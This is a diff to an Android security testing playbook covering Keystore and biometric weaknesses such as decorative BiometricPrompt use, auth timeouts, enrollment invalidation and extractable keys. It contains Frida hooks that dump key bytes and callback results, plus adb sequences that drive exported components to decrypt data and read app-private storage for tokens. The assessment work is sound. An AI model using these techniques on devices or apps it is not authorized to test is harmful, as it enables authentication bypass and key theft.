+| **Applies to** | API 23+ (`KeyGenParameterSpec`); `setUserAuthenticationParameters` is API 30+ and supersedes `setUserAuthenticationValidityDurationSeconds`; the app's own Keystore aliases (D12-004 table non-empty) — n/a for this APK when key use is delegated (D12-004 state b) |
+| **Requires** | device, frida, biometric |
+| **Maps to** | MASWE-0016 (Cryptographic Key Access Not Restricted, CWE-284/306 — "Assuming Hardware Implies Restriction" is called out explicitly), MASWE-0020, MASTG-TEST-0330, MASTG-TEST-0327, MASTG-BEST-0036, MASTG-KNOW-0043 (MASTG-TEST-0018 is deprecated — superseded by MASTG-TEST-0327/0330); AOSP keystore tags `TAG_NO_AUTH_REQUIRED`, `TAG_AUTH_TIMEOUT`, `TAG_USER_AUTH_TYPE`, `TAG_USER_SECURE_ID` |
 
 - **Test:** Hardware backing protects **extraction**, not **use**. A key with no auth requirement is usable
   by anything running in the app's UID. The app shows `BiometricPrompt`, then decrypts with a key that was
   never bound to the authentication — the prompt is decoration.
 - **How:**
 ```bash
-grep -rn -A25 'KeyGenParameterSpec\$Builder\|KeyGenParameterSpec\.Builder' out/sources/ \
+grep -rn -A25 'KeyGenParameterSpec\$Builder\|KeyGenParameterSpec\.Builder' $DEC/jadx/sources/ \
   | grep -nE 'setUserAuthenticationRequired|setUserAuthenticationParameters|setUserAuthenticationValidityDurationSeconds'
-grep -rn 'BiometricPrompt\|onAuthenticationSucceeded\|CryptoObject' out/sources/
+grep -rn 'BiometricPrompt\|onAuthenticationSucceeded\|CryptoObject' $DEC/jadx/sources/
 ```
   Confirm with the `userAuthRequired` column from the D12-004 table, then call the app's own decrypt path
   directly with no prompt shown:
@@ -1845,14 +1930,23 @@ Java.perform(function () {
   never bound:
 ```javascript
 Java.perform(function () {
-  var CB = Java.use('androidx.biometric.BiometricPrompt$AuthenticationCallback');
-  CB.onAuthenticationSucceeded.implementation = function (r) {
-    console.log('[*] forced success; CryptoObject=' + r.getCryptoObject());
-    return this.onAuthenticationSucceeded(r); };
+  // 1. the decisive observable: the CryptoObject passed to authenticate(); a 1-argument call = no key bound = decorative prompt
+  var BP = Java.use('androidx.biometric.BiometricPrompt');
+  BP.authenticate.overloads.forEach(function (o) { o.implementation = function () {
+    console.log('[authenticate] args=' + arguments.length + ' cryptoObject=' + (arguments.length > 1 ? arguments[1] : 'NONE'));
+    return o.apply(this, arguments); }; });
+  // 2. hook the app's CONCRETE callback subclasses — a hook on the abstract base class never fires because every app callback overrides it
+  Java.enumerateLoadedClassesSync().filter(function (n) { return !/^(android|androidx|java|kotlin|dalvik)\./.test(n); }).forEach(function (n) {
+    try { var C = Java.use(n); var S = C.class.getSuperclass();
+      if (S && S.getName() === 'androidx.biometric.BiometricPrompt$AuthenticationCallback') {
+        C.onAuthenticationSucceeded.implementation = function (r) {
+          console.log('[' + n + '] succeeded; CryptoObject=' + r.getCryptoObject()); return this.onAuthenticationSucceeded(r); }; } } catch (e) {}
+  });
 });
+// run it after the prompt has been shown once (so the subclass is loaded)
 ```
-- **Proof:** The pair, not either half: `r.getCryptoObject()` printing **`null`** (no key bound to the
-  authentication) **and** the app subsequently releasing the protected secret — ideally with the decrypted
+- **Proof:** The pair, not either half: an `[authenticate]` line with `cryptoObject=NONE` (or `r.getCryptoObject()`
+  printing **`null`** — no key bound to the authentication) **and** the app subsequently releasing the protected secret — ideally with the decrypted
   token then accepted by the server. The decisive negative observable is the **absence** of
   `UserNotAuthenticatedException` from `Cipher.doFinal`.
 - **Escalation:** → D13 (account takeover), D23 (transaction signing). Empirical anchors: Shopify's
@@ -1873,25 +1967,32 @@ Java.perform(function () {
 | **Severity ceiling** | High |
 | **VRT** | `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (varies); rate on the operation's value |
 | **Attacker** | AM-11 / AM-08 |
-| **Applies to** | API 23+; the two-argument `setUserAuthenticationParameters(duration, authType)` is API 30+ |
+| **Applies to** | API 23+; the two-argument `setUserAuthenticationParameters(duration, authType)` is API 30+; the app's own Keystore aliases (D12-004 table non-empty) — n/a for this APK when key use is delegated (D12-004 state b) |
+| **Requires** | device, frida, biometric |
 | **Maps to** | `developer.android.com/privacy-and-security/keystore` — duration-based ("key authorized for a time period after authentication") versus per-operation ("each cryptographic operation requires individual user authorization via `BiometricPrompt.authenticate()`"); MASWE-0023 (Step-Up Authentication Not Implemented for Sensitive Actions); AOSP `TAG_AUTH_TIMEOUT` |
 
 - **Test:** A non-zero duration means the key is usable by *anything* in the UID for that window after any
-  qualifying unlock — including a background operation the user never saw. `0` is auth-per-use and is the
-  correct value for a high-value action. Apps that describe a duration window as "you must authenticate
-  each time" are over-claiming.
+  qualifying unlock — including a background operation the user never saw. `0` in
+  `setUserAuthenticationParameters(0, …)` (or `-1` in the legacy `setUserAuthenticationValidityDurationSeconds`) is
+  auth-per-use and is the correct value for a high-value action — and it shows as `authTimeout=-1` in the D12-004
+  table, because `getUserAuthenticationValidityDurationSeconds()` reports -1 for a per-operation key (a 0 sets no
+  `TAG_AUTH_TIMEOUT`). Apps that describe a duration window as "you must authenticate each time" are over-claiming.
 - **How:**
 ```bash
-grep -rnA3 'setUserAuthenticationParameters\|setUserAuthenticationValidityDurationSeconds' out/sources/
+grep -rnA3 'setUserAuthenticationParameters\|setUserAuthenticationValidityDurationSeconds' $DEC/jadx/sources/
 ```
   Read `authTimeout` from the D12-004 table, then run the differential **asserting keyguard state at every
-  beat** — a first attempt at this without the assertion produced *inverted* results:
+  beat** — a first attempt at this without the assertion produced *inverted* results. If the probe prints nothing,
+  the beat is void; prefer the in-process `KeyguardManager.isKeyguardLocked()` read from the D12-053 hook when in doubt:
 ```bash
-assert_kg () { adb shell dumpsys window | grep -oE 'isKeyguardShowing=(true|false)'; }
+# the keyguard probe MUST print a value: current builds do not emit `isKeyguardShowing=` in `dumpsys window`, and an empty assertion is indistinguishable from a passing one
+assert_kg () { local kg; kg=$(adb shell dumpsys activity activities | grep -oE 'mKeyguardShowing=(true|false)' | head -1)
+  [ -n "$kg" ] || { echo 'KEYGUARD STATE UNREADABLE — fix the probe before trusting any beat' >&2; return 1; }; echo "$kg"; }
+assert_kg || exit 1                         # verify the string on your build first: adb shell dumpsys activity activities | grep -i keyguard
 adb shell locksettings set-pin 1234
 # beat 1: verified credential unlock, then sign immediately
 adb shell input keyevent 26; adb shell input keyevent 82; adb shell input text 1234; adb shell input keyevent 66
-assert_kg                                   # expect isKeyguardShowing=false
+assert_kg                                   # expect mKeyguardShowing=false
 adb shell am start -n com.target.app/.SignActivity --es op sign
 # beat 2: wait past the window with NO interaction, then sign again
 sleep 75; assert_kg
@@ -1904,8 +2005,8 @@ adb logcat -d | grep -iE 'UserNotAuthenticated|KeyPermanentlyInvalidated|signed'
   advertised and that is the finding.
 - **Escalation:** → D13 (the biometric gate grants more authority than the UI represents); a 300-second
   window on a payment-signing key is High on its own.
-- **Ruled out when:** `authTimeout == 0` (auth-per-use) on every key that gates a sensitive action, and the
-  second beat refuses. **A positive without its negative control is not evidence — and a muddled negative
+- **Ruled out when:** `authTimeout=-1` (auth-per-use; the D12-004 table never shows 0 for a per-operation key) on
+  every key that gates a sensitive action, and the second beat refuses. **A positive without its negative control is not evidence — and a muddled negative
   control is worse than none, because it will be reported as a result.**
 
 ### D12-050 · `setInvalidatedByBiometricEnrollment(false)` — enrol your own finger
@@ -1915,16 +2016,16 @@ adb logcat -d | grep -iE 'UserNotAuthenticated|KeyPermanentlyInvalidated|signed'
 | **Severity ceiling** | High |
 | **VRT** | `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (varies); exit to `broken_authentication_and_session_management.authentication_bypass` (P1) |
 | **Attacker** | AM-11 physical unlocked (a borrowed, shared or stolen-while-unlocked device) |
-| **Applies to** | **API 24+** |
+| **Applies to** | **API 24+**; the app's own Keystore aliases (D12-004 table non-empty) — n/a for this APK when key use is delegated (D12-004 state b) |
 | **Requires** | device, physical, biometric |
-| **Maps to** | MASWE-0022 (Crypto Keys Not Invalidated on New Biometric Enrollment); `developer.android.com/identity/sign-in/biometric-auth` ("ensures the key becomes unusable if the user enrols new biometric credentials"); `privacy-and-security/keystore` ("By default, keys supporting only biometric credentials are invalidated when new biometrics are enrolled") |
+| **Maps to** | MASTG-TEST-0328, MASTG-BEST-0037, MASWE-0022 (Crypto Keys Not Invalidated on New Biometric Enrollment); `developer.android.com/identity/sign-in/biometric-auth` ("ensures the key becomes unusable if the user enrols new biometric credentials"); `privacy-and-security/keystore` ("By default, keys supporting only biometric credentials are invalidated when new biometrics are enrolled") |
 
 - **Test:** The default invalidates a biometric-bound key on new enrolment. Setting it `false` means an
   attacker with brief access to an unlocked device can enrol **their own** fingerprint or face and then use
   the victim's key indefinitely. Coerced-unlock and evil-maid scenarios collapse into "add a finger".
 - **How:**
 ```bash
-grep -rn 'setInvalidatedByBiometricEnrollment' out/sources/ -B4 -A4
+grep -rn 'setInvalidatedByBiometricEnrollment' $DEC/jadx/sources/ -B4 -A4
 ```
 ```bash
 # empirical: authenticate, enrol a second biometric, retry
@@ -1950,19 +2051,20 @@ adb logcat -c; adb logcat | grep -i 'KeyPermanentlyInvalidated\|InvalidKey'
 | **Severity ceiling** | High |
 | **VRT** | `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (varies); rate on what the operation does |
 | **Attacker** | AM-10 physical locked |
-| **Applies to** | **Android 9 (API 28)+** |
+| **Applies to** | **Android 9 (API 28)+**; the app's own Keystore aliases (D12-004 table non-empty) — n/a for this APK when key use is delegated (D12-004 state b) |
+| **Requires** | device, physical |
 | **Maps to** | `developer.android.com/privacy-and-security/keystore` — `setUnlockedDeviceRequired`: "Key can only be used when the device is unlocked (if supported by secure hardware)"; AOSP `TAG_UNLOCKED_DEVICE_REQUIRED` |
 
 - **Test:** Without it, the key remains usable while the device is locked — so a background service, an
   exported entry point, a push handler or a locked-device execution primitive can use it.
 - **How:**
 ```bash
-grep -rn 'setUnlockedDeviceRequired' out/sources/ -B6 -A6
+grep -rn 'setUnlockedDeviceRequired' $DEC/jadx/sources/ -B6 -A6
 ```
   Read `unlockedDeviceRequired` from the D12-004 table, then:
 ```bash
 adb shell input keyevent 26                                  # lock the screen
-adb shell dumpsys window | grep -oE 'isKeyguardShowing=(true|false)'    # assert locked
+assert_kg                                                    # the D12-049 probe (dumpsys activity activities, mKeyguardShowing=); it must print true here — an empty probe voids the beat
 adb shell am broadcast -a com.target.app.SYNC -n com.target.app/.SyncReceiver
 adb shell am startservice -n com.target.app/.BackgroundSignService
 adb logcat -d | grep -iE 'decrypt|sign|UserNotAuthenticated'
@@ -1982,7 +2084,8 @@ adb logcat -d | grep -iE 'decrypt|sign|UserNotAuthenticated'
 | **Severity ceiling** | High |
 | **VRT** | `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (varies) |
 | **Attacker** | AM-11 (an attacker in the trusted place, or carrying a spoofed trusted Bluetooth address) |
-| **Applies to** | Android 5+ (trust agents); OEMs ship different agents — record which one you used |
+| **Applies to** | Android 5+ (trust agents); OEMs ship different agents — record which one you used; the app's own Keystore aliases (D12-004 table non-empty) — n/a for this APK when key use is delegated (D12-004 state b) |
+| **Requires** | device, physical |
 | **Maps to** | `KeyguardManager.isDeviceLocked` javadoc, verbatim: the device is considered unlocked when it is "kept unlocked by being near a trusted bluetooth device or in a trusted location" |
 
 - **Test:** `setUnlockedDeviceRequired(true)` asserts only that the device is *not locked*. With Smart Lock
@@ -1993,7 +2096,7 @@ adb logcat -d | grep -iE 'decrypt|sign|UserNotAuthenticated'
 ```bash
 adb shell dumpsys trust
 adb shell dumpsys lock_settings | grep -iE 'trust|agent'
-grep -rn 'setUnlockedDeviceRequired' out/sources/ -B6 -A6     # which key, used for what?
+grep -rn 'setUnlockedDeviceRequired' $DEC/jadx/sources/ -B6 -A6     # which key, used for what?
 ```
   Configure a trusted Bluetooth device on the test phone, pair it, move the phone away from the user, and
   use the key-backed feature with no authentication.
@@ -2012,8 +2115,9 @@ grep -rn 'setUnlockedDeviceRequired' out/sources/ -B6 -A6     # which key, used 
 | **Severity ceiling** | High |
 | **VRT** | `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (varies); exit to `broken_authentication_and_session_management.authentication_bypass` (P1) |
 | **Attacker** | AM-10/AM-11 — and this is exactly the device a thief has |
-| **Applies to** | all |
-| **Maps to** | `frameworks/base` `KeyguardManager.isDeviceSecure` javadoc — returns true "if the `Context`'s user has a secure lock screen"; `isDeviceLocked` considers the device "unlocked" when "the lock screen is dismissible with swipe" |
+| **Applies to** | all; the app's own Keystore aliases (D12-004 table non-empty) — n/a for this APK when key use is delegated (D12-004 state b) |
+| **Requires** | device, frida, biometric |
+| **Maps to** | MASTG-TEST-0326, MASTG-DEMO-0027; `frameworks/base` `KeyguardManager.isDeviceSecure` javadoc — returns true "if the `Context`'s user has a secure lock screen"; `isDeviceLocked` considers the device "unlocked" when "the lock screen is dismissible with swipe" |
 
 - **Test:** A key with `setUserAuthenticationRequired(true)` **cannot be generated** on a device with no
   PIN, pattern or password. Implementations commonly catch that exception and fall back to an unprotected
@@ -2058,7 +2162,7 @@ Java.perform(function () {
 | **Severity ceiling** | Medium |
 | **VRT** | `cryptographic_weakness.insecure_key_generation.insufficient_key_space` (P3) is the nearest crypto-native slot; realistically this is an assurance/claim-accuracy finding rated by what the claim gates |
 | **Attacker** | AM-11 with a device that lacks StrongBox |
-| **Applies to** | **Android 9 (API 28)+**; StrongBox optional from Android 10 for device-unique attestation |
+| **Applies to** | **Android 9 (API 28)+**; StrongBox optional from Android 10 for device-unique attestation; the app's own Keystore aliases (D12-004 table non-empty) — n/a for this APK when key use is delegated (D12-004 state b) |
 | **Requires** | device, physical |
 | **Maps to** | `developer.android.com/privacy-and-security/keystore` — check `PackageManager.FEATURE_STRONGBOX_KEYSTORE` first; `setIsStrongBoxBacked(true)` "throws `StrongBoxUnavailableException` if the algorithm/key size isn't supported"; StrongBox properties (own CPU, secure storage, TRNG, tamper resistance, secure timer) and supported algorithms (RSA 2048, AES 128/256, ECDSA/ECDH P-256, HMAC-SHA256, Triple DES); AOSP security-model §4.3.8 (StrongBox as TRH, first shipped on Pixel 3 / Titan M) |
 
@@ -2066,8 +2170,8 @@ Java.perform(function () {
   claim hardware protection.
 - **How:**
 ```bash
-grep -rn -A12 'setIsStrongBoxBacked' out/sources/ | grep -nE 'StrongBoxUnavailableException|catch|setIsStrongBoxBacked\(false\)|fallback'
-grep -rn 'FEATURE_STRONGBOX_KEYSTORE\|hasSystemFeature' out/sources/
+grep -rn -A12 'setIsStrongBoxBacked' $DEC/jadx/sources/ | grep -nE 'StrongBoxUnavailableException|catch|setIsStrongBoxBacked\(false\)|fallback'
+grep -rn 'FEATURE_STRONGBOX_KEYSTORE\|hasSystemFeature' $DEC/jadx/sources/
 adb shell pm list features | grep -i strongbox     # expect ABSENT on a stock AVD and on most non-flagships
 ```
 - **Proof:** On a device without `android.hardware.strongbox_keystore`, the app completing setup and
@@ -2086,7 +2190,8 @@ adb shell pm list features | grep -i strongbox     # expect ABSENT on a stock AV
 | **Severity ceiling** | High |
 | **VRT** | `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (varies); exit via the extractable key it creates |
 | **Attacker** | AM-03/AM-08 after the downgrade; AM-12 to induce it |
-| **Applies to** | **Android 13 (API 33)+** for the structured error hierarchy; the anti-pattern predates it |
+| **Applies to** | **Android 13 (API 33)+** for the structured error hierarchy; the anti-pattern predates it; the app's own Keystore aliases (D12-004 table non-empty) — n/a for this APK when key use is delegated (D12-004 state b) |
+| **Requires** | device, frida, biometric |
 | **Maps to** | `developer.android.com/about/versions/13/features` — Keystore/KeyMint error hierarchy under `java.security.ProviderException`, with `KeyStoreException` carrying error codes that "indicate whether errors are retryable" |
 
 - **Test:** `catch (Exception e) { useSoftwareFallback(); }` around key generation means a **transient**
@@ -2094,7 +2199,7 @@ adb shell pm list features | grep -i strongbox     # expect ABSENT on a stock AV
   never recovers, because the fallback key is now the persisted one.
 - **How:**
 ```bash
-grep -rn 'KeyGenParameterSpec\|KeyGenerator\.getInstance\|generateKey\(' out/sources/ -A12 \
+grep -rn 'KeyGenParameterSpec\|KeyGenerator\.getInstance\|generateKey\(' $DEC/jadx/sources/ -A12 \
   | grep -nE 'catch *\(|ProviderException|KeyStoreException|fallback|software|SecretKeySpec'
 ```
   Induce the failure once and watch what the app persists:
@@ -2108,7 +2213,7 @@ Java.perform(function () {
 });
 ```
 ```bash
-adb shell run-as com.target.app sh -c 'grep -rEl "[A-Za-z0-9+/]{32,}={0,2}" shared_prefs/ files/'
+adb shell "$AS 'grep -rEl \"[A-Za-z0-9+/]{32,}={0,2}\" /data/data/$PKG/shared_prefs /data/data/$PKG/files'"
 ```
 - **Proof:** After a single induced failure, a raw key appears in `shared_prefs` or `files` (or the
   D12-004 alias disappears) and the app keeps using it across restarts.
@@ -2124,14 +2229,18 @@ adb shell run-as com.target.app sh -c 'grep -rEl "[A-Za-z0-9+/]{32,}={0,2}" shar
 | **Severity ceiling** | High |
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) if the bytes are a constant; otherwise rate on the claim it invalidates |
 | **Attacker** | AM-08/AM-03 with in-process code execution; AM-01 if the material is constant |
-| **Applies to** | all |
-| **Maps to** | AOSP "Hardware-backed Keystore" — the AndroidKeyStore API runs "in the app's own process space", the keystore daemon holds only encrypted keyblobs, and the KeyMint TA "in a secure context, most often in TrustZone" holds the raw key material; AOSP security-model §4.3.8: "even with a fully compromised kernel, an attacker cannot read key material stored in Keymint" — a claim that only holds for keys actually in KeyMint |
+| **Applies to** | all; the app's own Keystore aliases (D12-004 table non-empty) — n/a for this APK when key use is delegated (D12-004 state b) |
+| **Requires** | frida, device |
+| **Maps to** | MASTG-KNOW-0045 (Secure Key Import into Keystore — the correct `WrappedKeyEntry` pattern); AOSP "Hardware-backed Keystore" — the AndroidKeyStore API runs "in the app's own process space", the keystore daemon holds only encrypted keyblobs, and the KeyMint TA "in a secure context, most often in TrustZone" holds the raw key material; AOSP security-model §4.3.8: "even with a fully compromised kernel, an attacker cannot read key material stored in Keymint" — a claim that only holds for keys actually in KeyMint |
 
 - **Test:** A key visible in a `SecretKeySpec`/`Cipher.init` hook is by definition extractable — it never
   lived in hardware. An app that generates keys with `KeyGenParameterSpec` *and* keeps a copy in a
   `byte[]`, or derives keys in-process from a constant, has no hardware guarantee whatever the marketing
   says.
 - **How:** Run the D12-002 hook and then the runtime triage that settles it in one line:
+```bash
+grep -rnE 'KeyProtection\.Builder|setEntry\(|SecretKeyEntry|PrivateKeyEntry|WrappedKeyEntry|IMPORT_WRAPPED' $DEC/jadx/sources -B6 -A4   # setEntry with a SecretKeySpec = the key existed in process; WrappedKeyEntry = secure import (MASTG-KNOW-0045), the correct pattern
+```
 ```javascript
 Java.perform(function () {
   var KS = Java.use('java.security.KeyStore'); var ks = KS.getInstance('AndroidKeyStore'); ks.load(null);
@@ -2141,7 +2250,8 @@ Java.perform(function () {
     console.log(a + ' getEncoded() -> ' + (enc === null ? 'null (TEE-backed)' : enc.length + ' BYTES — SOFTWARE/EXPORTABLE')); }
 });
 ```
-- **Proof:** Raw key bytes printing from `getEncoded()` or from the `SecretKeySpec` hook, set beside the
+- **Proof:** Raw key bytes printing from `getEncoded()` or from the `SecretKeySpec` hook — or a
+  `setEntry(new SecretKeyEntry(new SecretKeySpec(bytes…)))` site with the bytes from the D12-002 hook — set beside the
   vendor's stated control ("keys never leave the device", "hardware-backed"). A genuinely Keystore-backed
   key yields an opaque handle, not bytes.
 - **Escalation:** → D11 (offline decryption of everything the key protects), D15 (forge signed requests).
@@ -2158,7 +2268,8 @@ Java.perform(function () {
 | **Severity ceiling** | Medium |
 | **VRT** | `cryptographic_weakness.insufficient_entropy.predictable_initialization_vector` (P4); `.initialization_vector_reuse` (P5) |
 | **Attacker** | AM-03/AM-08 |
-| **Applies to** | API 23+ |
+| **Applies to** | API 23+; the app's own Keystore aliases (D12-004 table non-empty) — n/a for this APK when key use is delegated (D12-004 state b) |
+| **Requires** | frida, device |
 | **Maps to** | MASWE-0007; the `randomizedEnc` column of the D12-004 `KeyInfo` read |
 
 - **Test:** By default a Keystore key requires randomised encryption — the system generates the IV and the
@@ -2166,7 +2277,7 @@ Java.perform(function () {
   D12-019 and D12-020 come from, and it is invisible to a grep for `IvParameterSpec` alone.
 - **How:**
 ```bash
-grep -rn 'setRandomizedEncryptionRequired' out/sources/ -B6 -A6
+grep -rn 'setRandomizedEncryptionRequired' $DEC/jadx/sources/ -B6 -A6
 ```
   Read `randomizedEnc` from the D12-004 table for every alias, and correlate with the `[IV]` hook output
   from D12-002 to see whether the IV that reaches the cipher is app-chosen and constant.
@@ -2184,7 +2295,7 @@ grep -rn 'setRandomizedEncryptionRequired' out/sources/ -B6 -A6
 | **Severity ceiling** | Critical |
 | **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null — rated on what it exposes); exit to `broken_authentication_and_session_management.authentication_bypass` (P1) or `sensitive_data_exposure.disclosure_of_secrets.*` |
 | **Attacker** | AM-03 zero-permission local app |
-| **Applies to** | all |
+| **Applies to** | all; the app's own Keystore aliases (D12-004 table non-empty) — n/a for this APK when key use is delegated (D12-004 state b) |
 | **Requires** | device, frida, biometric |
 | **Maps to** | AOSP security-model §4.3.8, verbatim: "only storing and using keys in TEE or TRH does not completely solve the problem … if an attacker gains access to the low-level interfaces for communicating directly with Keymint or Strongbox, they can use it as an oracle for cryptographic operations that require the private key. This is the reason why keys can be authentication bound and/or require user presence verification." |
 
@@ -2193,7 +2304,7 @@ grep -rn 'setRandomizedEncryptionRequired' out/sources/ -B6 -A6
 - **How:**
 ```bash
 # crypto sinks whose callers are IPC entry points
-grep -rn -B12 'Cipher\.getInstance\|Signature\.getInstance\|Mac\.getInstance\|\.doFinal(\|\.sign()' out/sources/ \
+grep -rn -B12 'Cipher\.getInstance\|Signature\.getInstance\|Mac\.getInstance\|\.doFinal(\|\.sign()' $DEC/jadx/sources/ \
   | grep -nE 'onReceive|onBind|onStartCommand|onHandleIntent|@JavascriptInterface|onCreate\(Bundle|call\(|query\(|openFile\('
 # and the exported components that reach them
 grep -n 'android:exported="true"' AndroidManifest.xml -B4 -A8
@@ -2222,7 +2333,7 @@ adb shell content call --uri content://com.target.app.crypto --method decrypt --
 | **Severity ceiling** | Critical |
 | **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when the shared key signs authentication assertions; `sensitive_data_exposure.disclosure_of_secrets.for_internal_asset` (P3) otherwise |
 | **Attacker** | AM-08 / AM-03 (the grantee) |
-| **Applies to** | **Android 16 (API 36)+**. New enough that essentially no public checklist covers it — grep for it on every Android-16-targeting app |
+| **Applies to** | **Android 16 (API 36)+**. New enough that essentially no public checklist covers it — grep for it on every Android-16-targeting app; the app's own Keystore aliases (D12-004 table non-empty) — n/a for this APK when key use is delegated (D12-004 state b) |
 | **Requires** | api>=36, device, frida |
 | **Maps to** | `developer.android.com/about/versions/16/features` — `KeyStoreManager`, `grantKeyAccess(String, int)`, `revokeKeyAccess(String, int)`, "Share access to Android Keystore keys with other apps" |
 
@@ -2230,7 +2341,7 @@ adb shell content call --uri content://com.target.app.crypto --method decrypt --
   grant that is never revoked on teardown, is the finding.
 - **How:**
 ```bash
-grep -rn 'KeyStoreManager\|grantKeyAccess\|revokeKeyAccess' out/sources/ -B6 -A6
+grep -rn 'KeyStoreManager\|grantKeyAccess\|revokeKeyAccess' $DEC/jadx/sources/ -B6 -A6
 ```
 ```javascript
 Java.perform(function () {
@@ -2259,7 +2370,7 @@ adb shell dumpsys package | grep -B2 "userId=<uid>"      # resolve the uid to a 
 | **Severity ceiling** | Medium |
 | **VRT** | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (**P5**) as filed naively — rate the consequence instead |
 | **Attacker** | AM-08/AM-03 with an in-process or read primitive |
-| **Applies to** | all; Jetpack Security's `EncryptedSharedPreferences` is **deprecated as of 1.1.0** and Google advises against it in new apps |
+| **Applies to** | all; Jetpack Security's `EncryptedSharedPreferences` is **deprecated as of 1.1.0** and Google advises against it in new apps; the app's own Keystore aliases (D12-004 table non-empty) — n/a for this APK when key use is delegated (D12-004 state b) |
 | **Requires** | frida, device |
 | **Maps to** | MASWE-0003, MASWE-0016; the D12-004 alias table |
 
@@ -2268,7 +2379,7 @@ adb shell dumpsys package | grep -B2 "userId=<uid>"      # resolve the uid to a 
   rather than declaring the store safe.
 - **How:**
 ```bash
-grep -rn 'EncryptedSharedPreferences\|MasterKey\|MasterKeys\|EncryptedFile' out/sources/ -A12 \
+grep -rn 'EncryptedSharedPreferences\|MasterKey\|MasterKeys\|EncryptedFile' $DEC/jadx/sources/ -A12 \
   | grep -nE 'setUserAuthenticationRequired|setInvalidatedByBiometricEnrollment|setUserAuthenticationValidityDurationSeconds|setUnlockedDeviceRequired|AES256_GCM'
 ```
 ```javascript
@@ -2292,7 +2403,7 @@ Java.perform(function () {
 | **Severity ceiling** | Low |
 | **VRT** | `cryptographic_weakness.incomplete_cleanup_of_keying_material` (**P5**, CWE-459); `insecure_os_firmware.failure_to_remove_sensitive_artifacts_from_disk` (varies); `broken_authentication_and_session_management.failure_to_invalidate_session.on_logout` (P4) |
 | **Attacker** | AM-11 / AM-03 with a read primitive |
-| **Applies to** | all, especially E2EE messaging and vault apps |
+| **Applies to** | all, especially E2EE messaging and vault apps; the app's own Keystore aliases (D12-004 table non-empty) — n/a for this APK when key use is delegated (D12-004 state b) |
 | **Requires** | device, frida |
 | **Maps to** | H1 #1189168 (Nextcloud, "Android app does not clear end to end encryption keys", **$100**) against H1 #1189162 (Nextcloud, "End to end encryption public key is not properly verified", **$1,500**) — the verification failure is worth fifteen times the hygiene failure |
 
@@ -2300,12 +2411,13 @@ Java.perform(function () {
   its value is as a supporting fact under a real finding.
 - **How:**
 ```bash
-adb shell run-as com.target.app sh -c 'ls -laR files shared_prefs databases no_backup' > before.txt
+adb shell "$AS 'ls -laR /data/data/$PKG/files /data/data/$PKG/shared_prefs /data/data/$PKG/databases /data/data/$PKG/no_backup'" > before.txt   # quoting matters: an unquoted sh -c runs `sh -c ls` on the device, both files come back empty and diff reads as "no change"
 # log out in the app, then:
-adb shell run-as com.target.app sh -c 'ls -laR files shared_prefs databases no_backup' > after.txt
+adb shell "$AS 'ls -laR /data/data/$PKG/files /data/data/$PKG/shared_prefs /data/data/$PKG/databases /data/data/$PKG/no_backup'" > after.txt
+[ -s before.txt ] && [ -s after.txt ] || echo 'EMPTY LISTING — the shell command did not run; fix AS/quoting before trusting the diff'
 diff before.txt after.txt
-adb shell run-as com.target.app sh -c 'cat shared_prefs/*.xml' | grep -iE 'key|token|passphrase'
-grep -rn 'deleteEntry(\|\.remove(\|clear()' out/sources/ -B6 | grep -in 'logout\|signOut\|wipe'
+adb shell "$AS 'cat /data/data/$PKG/shared_prefs/*.xml'" | grep -iE 'key|token|passphrase'
+grep -rn 'deleteEntry(\|\.remove(\|clear()' $DEC/jadx/sources/ -B6 | grep -in 'logout\|signOut\|wipe'
 ```
 - **Proof:** The private key, passphrase or wrapped blob still present and still usable after an explicit
   logout — demonstrated by decrypting with it post-logout.
@@ -2322,17 +2434,18 @@ grep -rn 'deleteEntry(\|\.remove(\|clear()' out/sources/ -B6 | grep -in 'logout\
 | **VRT** | `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (varies) — realistically a hardening finding unless a server trusts a client assertion instead |
 | **Attacker** | AM-12 (static observation) |
 | **Applies to** | key attestation is **API 24+**; ID attestation **API 28+**; StrongBox **API 28+** |
-| **Maps to** | the emulator-caveat rule — the only *fair* comment on any device is whether the app **requests** `setIsStrongBoxBacked(true)` and whether it **verifies** the attestation chain |
+| **Requires** | — |
+| **Maps to** | MASTG-KNOW-0044 (Key Attestation); the emulator-caveat rule — the only *fair* comment on any device is whether the app **requests** `setIsStrongBoxBacked(true)` and whether it **verifies** the attestation chain |
 
 - **Test:** You cannot characterise hardware backing from an emulator, but you can always state, by
   `file:line`, that the app never asks for StrongBox and never generates or checks an attestation chain.
   That is a defensible observation; an emulator reading is not.
 - **How:**
 ```bash
-grep -rn 'setIsStrongBoxBacked\|FEATURE_STRONGBOX_KEYSTORE' out/sources/
-grep -rn 'setAttestationChallenge\|getCertificateChain\|AttestationApplicationId\|X509Certificate\[\]' out/sources/
-grep -rn '1\.3\.6\.1\.4\.1\.11129\.2\.1\.17' out/sources/          # the KeyDescription extension OID
-grep -rn 'isInsideSecureHardware\|getSecurityLevel' out/sources/    # does the app even ask?
+grep -rn 'setIsStrongBoxBacked\|FEATURE_STRONGBOX_KEYSTORE' $DEC/jadx/sources/
+grep -rn 'setAttestationChallenge\|getCertificateChain\|AttestationApplicationId\|X509Certificate\[\]' $DEC/jadx/sources/
+grep -rn '1\.3\.6\.1\.4\.1\.11129\.2\.1\.17' $DEC/jadx/sources/          # the KeyDescription extension OID
+grep -rn 'isInsideSecureHardware\|getSecurityLevel' $DEC/jadx/sources/    # does the app even ask?
 ```
 - **Proof:** The absence of a StrongBox request and the absence of any attestation-chain generation or
   verification, each cited by `file:line` — **not** an emulator reading.
@@ -2350,13 +2463,14 @@ grep -rn 'isInsideSecureHardware\|getSecurityLevel' out/sources/    # does the a
 | **VRT** | `cryptographic_weakness.insufficient_verification_of_data_authenticity.cryptographic_signature` (varies); exit to `broken_authentication_and_session_management.authentication_bypass` (P1) when it gates enrolment |
 | **Attacker** | AM-12 for the bypass demonstration, AM-01 for the consequence |
 | **Applies to** | all apps using key attestation |
